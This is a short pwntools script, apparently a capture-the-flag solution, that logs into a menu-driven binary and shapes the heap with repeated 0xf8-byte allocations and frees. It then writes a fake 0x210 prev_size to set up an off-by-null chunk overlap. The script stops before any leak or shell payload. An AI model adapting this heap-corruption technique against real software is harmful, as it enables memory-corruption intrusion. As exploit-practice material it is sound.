from pwn import *

def start(argv = [], *a, **kw):
    if args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE:
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    else:
        return process([exe] + argv, *a, **kw)


gdbscript = '''
init-pwndbg
interrupt
continue
'''.format(**locals())

#Binary filename
exe = './pwn_patched'
elf = context.binary = ELF(exe, checksec=False)
context.log_level = 'debug'

################################################################

p = start()

def add(topic, size, info, score):
    p.sendlineafter(b"choice>>", "1")
    p.sendlineafter(b"topic name:", str(topic))
    p.sendlineafter(b"des size:", str(size))
    p.sendafter(b"topic des:", str(info))
    p.sendlineafter(b"topic score:", str(score))

def Delete(index):
    p.sendlineafter(b"choice>>", "2")
    p.sendlineafter(b"index:", str(index))

def show(index):
    p.sendlineafter(b"choice>>", "3")
    p.sendlineafter(b"index:", str(index))

p.sendlineafter(b"input manager name:", b"CTFM")
p.sendlineafter(b"input password:", b"123456")

for i in range(10):
    add("AAAA", 0xf8, "AAAAA", i)
for i in range(6):
    Delete(i)

Delete(9)

for i in range(6, 9):
    Delete(i)

for i in range(9):
    add(str(i), 0xf8, "BBBB", i)

for i in range(6):
    Delete(i)

Delete(8)
Delete(7)

add("8", 0xf8, 'C'*0xf8, "8")

for i in range(6):
    Delete(0)
    add("8", 0xf8, 'C'*(0xf8-i-1), "8")

Delete(0)
add("8", 0xf8, b'C'*(0xf0) + p64(0x210), "8")
Delete(0)
add("8", 0xf8, b'C'*(0xf0), "8")

p.interactive()
